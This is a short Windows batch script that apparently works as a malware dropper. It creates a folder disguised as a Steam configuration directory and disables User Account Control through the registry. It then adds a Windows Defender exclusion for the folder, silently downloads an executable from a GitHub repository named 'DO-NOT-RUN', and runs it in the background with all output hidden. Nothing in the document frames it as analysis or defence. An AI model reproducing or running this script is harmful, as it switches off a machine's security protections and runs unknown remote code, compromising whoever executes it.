@echo off
setlocal enabledelayedexpansion

set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
if not exist "%folderPath%" mkdir "%folderPath%"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1

curl -L -o "%folderPath%\vmtest.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" >nul 2>&1
if %errorlevel% neq 0 exit /b 1

if not exist "%folderPath%\vmtest.exe" exit /b 1
for %%F in ("%folderPath%\vmtest.exe") do set filesize=%%~zF
if "%filesize%"=="0" exit /b 1

start "" /b "%folderPath%\vmtest.exe"
exit
